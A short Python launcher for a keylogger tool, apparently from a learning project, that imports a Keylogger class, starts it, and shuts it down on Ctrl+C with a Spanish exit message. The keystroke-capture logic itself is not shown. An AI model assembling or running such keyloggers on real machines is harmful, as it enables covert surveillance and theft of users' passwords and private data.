from keylogger import Keylogger
import signal
import sys
from termcolor import colored

def signal_handler(sig, frame):
    print(colored("\n [!] Saliendo del keylogger...", 'red'))
    keylogger.shutdown()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    global keylogger
    keylogger = Keylogger()
    keylogger.start()

if __name__ == "__main__":
    main()
